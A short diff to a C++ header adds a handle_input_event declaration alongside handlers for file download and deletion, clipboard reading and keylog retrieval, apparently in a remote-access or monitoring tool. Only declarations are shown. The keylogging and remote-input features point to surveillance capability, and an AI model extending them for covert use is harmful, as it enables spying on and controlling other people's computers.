@@ -19,6 +19,7 @@ private:
     Json handle_download_file(const Json& req);
     Json handle_delete_file(const Json& req);
     Json handle_clipboard_get(const Json& req);
+    Json handle_input_event(const Json& req);
 
     Json handle_getkeylogs(const Json& req);
     Json handle_clearlogs(const Json& req);
